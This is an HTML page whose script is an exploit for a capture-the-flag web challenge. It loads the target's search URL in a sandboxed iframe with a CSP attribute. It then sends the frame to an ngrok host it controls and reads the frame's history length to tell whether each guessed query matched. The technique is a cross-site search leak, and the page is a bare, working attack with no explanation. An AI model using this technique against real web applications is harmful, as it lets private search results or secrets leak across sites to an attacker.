<!DOCTYPE html>
<html>
<body>
    <script>
    (async function(){
    async function go(body) {
      let url = "https://lamenote-web.chal.irisc.tf/search?query="+ body
      f = document.createElement('iframe')
      f.setAttribute('csp', "img-src 'none';")
      f.src = url; // go to the site
      f.onload = () => {
          rCount += 1;
          // change location after onload once
          setTimeout(() => {
              f.onload = null
              f.src = url;
          }, 100)
      }
      document.body.appendChild(f)
      await new Promise(r => setTimeout(r, 1000)); // sleep 1000ms to wait for it to load 
      f.remove();
      f.src = 'https://3538-49-36-234-70.ngrok-free.app/';
      document.body.appendChild(f)
      await new Promise(r => setTimeout(r, 1000)); // sleep 1000ms to wait for it to load 
      let length = f.contentWindow.history.length;
      console.log(`${body} history=${length}`)
      document.body.innerHTML = "";
      return length;
    }
    await go('!')
    await go('a')
    await go('b')
    await go('x')
    })();
    </script>
</body>
</html>
